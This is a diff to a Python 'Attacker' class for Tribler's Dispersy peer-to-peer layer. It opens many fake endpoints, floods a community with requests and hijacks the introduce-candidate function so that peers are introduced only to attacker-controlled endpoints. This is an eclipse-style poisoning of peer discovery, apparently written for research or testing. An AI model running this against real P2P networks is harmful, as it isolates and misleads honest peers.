@@ -1,6 +1,7 @@
 import sys
 from Tribler.dispersy.endpoint import StandaloneEndpoint
-from Tribler.dispersy.candidate import BootstrapCandidate
+from Tribler.dispersy.candidate import BootstrapCandidate, WalkCandidate
+from random import choice
 
 class Attacker:
 
@@ -26,16 +27,23 @@ class Attacker:
                         dispersy.callback.register(self.send_requests, (community, candidate))
                         self.nr_candidates -= 1
 
+        def get_introduce_candidate(exclude_candidate=None):
+            _, _, candidate = choice(self.endpoints)
+            return candidate
+
         for community in dispersy.get_communities():
             community.old_add_candidate = community.add_candidate
             community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)
+
+            community.old_get_introduce_candidate = community.dispersy_get_introduce_candidate
+            community.dispersy_get_introduce_candidate = get_introduce_candidate
 
         # step 4, schedule disconnect
         dispersy.callback.register(self.disconnect, delay=300.0)
 
     def send_requests(self, community, candidate):
         while not self.disconnected:
-            for lan_port, endpoint in self.endpoints:
+            for lan_port, endpoint, _ in self.endpoints:
                 cur_endpoint = community.dispersy._endpoint
                 cur_lanport = community.dispersy._lan_address[1]
                 cur_wanport = community.dispersy._wan_address[1]
@@ -58,16 +66,18 @@ class Attacker:
     def connect(self):
         while len(self.endpoints) < self.nr_endpoints:
             prevport = self.endpoints[-1][0] if len(self.endpoints) else self.dispersy.lan_address[1] + 1000
+
             endpoint = StandaloneEndpoint(prevport + 1)
             endpoint.open(self.dispersy)
 
-            self.endpoints.append((endpoint._port, endpoint))
+            sock_addr = (self.dispersy.lan_address[0], endpoint._port)
+            self.endpoints.append((endpoint._port, endpoint, WalkCandidate(sock_addr, False, sock_addr, sock_addr, u"public")))
 
         self.disconnected = False
 
     def disconnect(self):
         self.disconnected = True
 
-        for _, endpoint in self.endpoints:
+        for _, endpoint, _ in self.endpoints:
             endpoint.close()
 
